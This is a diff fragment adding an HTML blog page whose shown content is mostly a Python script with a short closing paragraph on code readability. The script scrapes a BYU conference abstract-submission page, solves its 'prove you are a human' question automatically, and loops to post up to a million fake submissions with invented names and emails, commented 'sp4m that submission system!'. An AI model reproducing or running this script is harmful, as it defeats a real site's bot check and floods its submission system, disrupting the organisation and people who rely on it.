+    <span class="n">labels</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">&#39;label&#39;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">label</span> <span class="ow">in</span> <span class="n">labels</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">&#39;To prove you are a human type&#39;</span> <span class="ow">in</span> <span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+            <span class="k">return</span> <span class="n">get_the_secret</span><span class="p">(</span><span class="n">label</span><span class="o">.</span><span class="n">contents</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">    The main function</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+    <span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://cpms.byu.edu/about/&#39;</span> \
+        <span class="s">&#39;spring-research-conference/abstract-submission/&#39;</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">grab_the_page</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+    <span class="n">word_key</span> <span class="o">=</span> <span class="n">grab_the_word_key</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">word_value</span> <span class="o">=</span> <span class="n">parse_the_page</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">num_to_spam</span> <span class="o">=</span> <span class="mi">1000000</span>
+    <span class="n">degree_levels</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;Undergraduate&#39;</span><span class="p">,</span> <span class="s">&#39;Masters&#39;</span><span class="p">,</span> <span class="s">&#39;Doctorate&#39;</span><span class="p">]</span>
+    <span class="n">advisors_nums</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;169&#39;</span><span class="p">,</span> <span class="s">&#39;171&#39;</span><span class="p">,</span> <span class="s">&#39;g_127&#39;</span><span class="p">,</span> <span class="s">&#39;g_129&#39;</span><span class="p">,</span> <span class="s">&#39;g_132&#39;</span><span class="p">]</span>
+    <span class="c"># sp4m that submission system!</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Jargon&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">dictionary</span><span class="p">,</span> \
+            <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Given-Names&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">first_names</span><span class="p">,</span> \
+            <span class="nb">open</span><span class="p">(</span><span class="s">&#39;Family-Names&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">last_names</span><span class="p">:</span>
+        <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">while</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="n">num_to_spam</span><span class="p">:</span>
+            <span class="n">first_name</span> <span class="o">=</span> <span class="n">first_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="n">last_name</span> <span class="o">=</span> <span class="n">last_names</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="n">email</span> <span class="o">=</span> <span class="n">first_name</span><span class="o">+</span><span class="n">last_name</span><span class="o">+</span><span class="s">&#39;@gmail.com&#39;</span>
+            <span class="n">degree_level</span> <span class="o">=</span> <span class="n">degree_levels</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">degree_levels</span><span class="p">))]</span>
+            <span class="n">department</span> <span class="o">=</span> <span class="s">&#39;2&#39;</span>  <span class="c"># this is the code for computer science</span>
+            <span class="n">faculty_advisor</span> <span class="o">=</span> <span class="n">advisors_nums</span><span class="p">[</span><span class="n">randrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">advisors_nums</span><span class="p">))]</span>
+            <span class="n">abstract_title</span> <span class="o">=</span> <span class="n">dictionary</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+            <span class="n">abstract</span> <span class="o">=</span> <span class="n">first_name</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">last_name</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">email</span> <span class="o">+</span> \
+                <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">degree_level</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">department</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> \
+                <span class="n">faculty_advisor</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">+</span> <span class="n">abstract_title</span>
+            <span class="n">abstract</span> <span class="o">+=</span> <span class="s">&#39; &#39;</span><span class="o">+</span><span class="n">abstract</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;first_name&#39;</span><span class="p">:</span> <span class="n">first_name</span><span class="p">,</span>
+                    <span class="s">&#39;last_name&#39;</span><span class="p">:</span> <span class="n">last_name</span><span class="p">,</span>
+                    <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
+                    <span class="s">&#39;degree_level&#39;</span><span class="p">:</span> <span class="n">degree_level</span><span class="p">,</span>
+                    <span class="s">&#39;department&#39;</span><span class="p">:</span> <span class="n">department</span><span class="p">,</span>
+                    <span class="s">&#39;faculty_advisor&#39;</span><span class="p">:</span> <span class="n">faculty_advisor</span><span class="p">,</span>
+                    <span class="s">&#39;abstract_title&#39;</span><span class="p">:</span> <span class="n">abstract_title</span><span class="p">,</span>
+                    <span class="s">&#39;abstract&#39;</span><span class="p">:</span> <span class="n">abstract</span><span class="p">,</span>
+                    <span class="s">&#39;num&#39;</span><span class="p">:</span> <span class="n">word_key</span><span class="p">,</span>
+                    <span class="s">&#39;key&#39;</span><span class="p">:</span> <span class="n">word_value</span><span class="p">,</span>
+                    <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Submit&#39;</span>
+                    <span class="p">}</span>
+            <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">print</span> <span class="s">&#39;Finished spamming the submission system&#39;</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Readable code is just as important as working code, especially when collaborating with others. If the author can't even understand what the code does after not looking at it for a while then how will anyone else understand it? How can that code be improved if the programmer does not even understand what it does in the first place? Improve your Python code (or any code) by using these tools and always striving to make your code more readable. Force youself if you have to by setting up pre-commit git hooks in all of your repos. You will be glad you did. </p>
+<p>Other good reading:</p>
+<ul>
+<li><a href="http://legacy.python.org/dev/peps/pep-0257/">PEP 257</a>  </li>
+<li><a href="http://legacy.python.org/dev/peps/pep-0020/">PEP 20</a></li>
+</ul>
+    
+<div class=twitter>
+<a href="https://twitter.com/share" class="twitter-share-button">Tweet</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</div>
+    <p class=tags>This entry was tagged as
+      <a href="/tag/python.html">python</a>
+    </p>
+        </div>
+        
+<div class=footer>
+  <p>&copy; Copyright <script language="JavaScript">var date = new Date(); document.write(date.getFullYear());</script> by Sean Beck</p>
+  <p> Powered by <a href="http://pypi.python.org/pypi/pelican/" target="_blank">Pelican</a>.  
+    <a href="https://github.com/fjavieralba/flasky">Theme</a>  by <a href="http://fjavieralba.com">fjavieralba</a>
+  </p> 
+  <p>
+    <div class=social style="font-size: 27px;">
+      <ul>
+<script language="JavaScript">
+          u = 'seanmckaybeck';
+          s = 'gmail.com';
+          document.write('<a href=\"mailto:' + u + '@' + s + '\" target=\"_blank\">');
+        </script>
+            <li><i class="icon-envelope icon-large"></i> </li>
+        </a><a href="http://twitter.com/seanmckaybeck" target="_blank"> <li> <i class="icon-twitter-sign icon-large"> </li></i> </a><a href="https://www.linkedin.com/in/seanmckaybeck" target="_blank"><li><i class="icon-linkedin-sign icon-large" ></i></li></a><a href="https://github.com/ThaWeatherman" target="_blank"> <li> <i class="icon-github-sign icon-large"></i> </li> </a>
+
+        <a href="https://seanmckaybeck.com/feeds/all.rss.xml" rel="alternate" title="Recent Blog Posts"><li> <i class="icon-rss icon-large"></i> </li></a>
+      </ul>
+    </div>
+  </p>
+</div>    </div>
+  </body>
+</html>
